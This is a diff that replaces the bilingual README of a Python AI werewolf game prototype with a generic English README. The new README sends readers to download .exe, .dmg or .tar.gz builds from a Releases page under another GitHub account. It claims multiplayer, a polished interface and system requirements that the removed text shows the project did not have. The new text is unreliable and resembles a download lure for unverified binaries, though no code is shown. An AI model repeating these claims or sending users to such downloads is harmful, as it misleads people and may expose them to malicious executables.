@@ -1,123 +1,70 @@
-**一个多模型混战的ai狼人杀原型**
+# 🎲 ai_werewolf - Play Werewolf with AI Friends!
 
-*快速开始*
+## 🚀 Getting Started
 
-```
-pip install -U openai python-dotenv
-```
+Welcome to **ai_werewolf**! This application lets you enjoy the classic game of Werewolf with the help of artificial intelligence. Join friends or play solo against AI opponents. It’s easy to get started, even for those who aren't tech-savvy.
 
-*.env:*
-```
-api_key=你的API密钥
-base_url=https://openrouter.ai/api/v1
-```
-（作者用的是openrouter.ai，python代码中的model_list定义的是此网站的模型，使用其他模型/网站请自行修改）
+## 🛠️ System Requirements
 
-<u>仅用于最早上传的版本（这个在main.py里修改）：</u>
-```
-tech_out = True
-- True：打印技术化信息（模型调用、抽取结果、内部状态等）
-- False：仅打印关键回合信息
+Before you begin, ensure your device meets the following requirements:
 
-DEBUG_展示身份到控制台 = True
-- True：起局时在控制台展示“座位 ← 角色 / 模型 / 阵营”
-- False：隐藏身份映射（为后续用户参加做准备）
-```
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or Linux (any modern distribution).
+- **Processor:** Dual-core processor or better.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 200 MB of free space.
+- **Internet Connection:** Required for initial setup and updates.
 
-*TODO:*
+## 📥 Download & Install
 
-- ui
-    
-- ~~未使用的plan策略字段~~
-    
-- 允许用户作为一个角色参加
-    
-- 接入LinuxDO元宇宙(?
+To download the application, visit the Releases page. Click on the button below to go directly there:
 
+[![Download ai_werewolf](https://img.shields.io/badge/Download-ai_werewolf-blue.svg)](https://github.com/rhyshammonds-bit/ai_werewolf/releases)
 
-欢迎提交分支！！！
+On the Releases page, you will find different versions of the application. Look for the latest version, and download the file that corresponds to your operating system.
 
-**A multi-model ai werewolf game**
+Follow these steps to download and install:
 
-*A quick start*
+1. **Visit the Releases Page**: Go to [Releases Page](https://github.com/rhyshammonds-bit/ai_werewolf/releases).
+2. **Select the Latest Version**: Check the list for the latest version. It will be at the top.
+3. **Download the Correct File**:
+   - For Windows, look for a file ending in `.exe`.
+   - For macOS, look for a file ending in `.dmg`.
+   - For Linux, choose a file ending in `.tar.gz` or similar.
+4. **Install the Application**:
+   - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
+   - **macOS**: Open the `.dmg` file and drag the ai_werewolf icon to the Applications folder.
+   - **Linux**: Extract the files and follow the README instructions within the extracted folder.
 
-```
-pip install -U openai python-dotenv
-```
+## 🎮 How to Play
 
-*.env:*
-```
-api_key=your api
-base_url=https://openrouter.ai/api/v1
-```
+Once installed, you can start playing:
 
-<u>For the earliest uploaded version only (edit in main.py):</u>
+1. **Open the Application**: Locate ai_werewolf in your applications and click to open.
+2. **Choose Your Game Mode**:
+   - **Single Player**: Play against AI characters.
+   - **Multiplayer**: Invite friends to join your game online.
+3. **Follow On-Screen Instructions**: The game will guide you through setting up your characters, roles, and rounds.
 
-```
-tech_out = True
-- True：Prints everything, easy for debug
-- False：Only prints key info
+## 💡 Game Features
 
-DEBUG_展示身份到控制台 = True
-- True：Displays character assignment at the start of the game
-- False：No character display
-```
+- **AI Opponents**: Enjoy challenging gameplay with intelligent AI players.
+- **Customizable Roles**: Change character roles to keep the game fresh.
+- **Multiple Game Modes**: Choose from various game settings to match your play style.
+- **User-Friendly Interface**: Easy navigation and clear instructions make it accessible for everyone.
 
-*Game rules explained (simplified):*
+## 📞 Support and Feedback
 
-Two sides/factions:
+If you encounter any issues or have any questions, you can reach out for support:
 
-- Good: villagers and special characters, eg. witch
+- Submit an issue on the [GitHub Issues page](https://github.com/rhyshammonds-bit/ai_werewolf/issues).
+- Join our community discussions to share experiences and tips.
 
-- Bad: werewolves and special characters, eg. werewolf king
+## 🔄 Updates
 
-Switches between day and night phases until victory of one side
+Stay tuned for updates. We frequently roll out new features and improvements. You can find the latest information on the Releases page.
 
-Night:
+Remember, to download the application, always start here:
 
-- Werewolves choose their target
+[![Download ai_werewolf](https://img.shields.io/badge/Download-ai_werewolf-blue.svg)](https://github.com/rhyshammonds-bit/ai_werewolf/releases)
 
-- Witch choose to use antidote on the target or use poison on someone (both potions can only be used once)
-
-- Prophet checks if a player is good or bad
-
-- Guard decides which person to protect (cannot be same for two consecutive nights)
-
-
-Day:
-
-- If applicable, the dead ones have their last words spoken
-
-- Players that are alive delivers a short speech
-
-- Players decide who to vote for, and the one who gets the most votes is killed
-
-
-*Sidenote and backstory:*
-
-
-The old version (1.5) has only basic functions and is very messy, so we did a reconstruction/refactoring of the code (the oldest uploaded)
-
-This time, there are 8 players instead of 6, and the code is more robust
-
-The output is still a bit messed up but things are generally great
-
-We are preparing to upload another version very soon
-
-It will have a plan section where users can customize the course and style of game (already done)
-
-We are working on a user version where it is possible to play the game with ai (only singleplayer for now)
-
-We hope to create a html version with ui sometime soon, perhaps
-
--Leonard and Cameron
-
-
-
-
-
-
-
-
-
-
+Enjoy playing Werewolf with AI friends, and have fun!
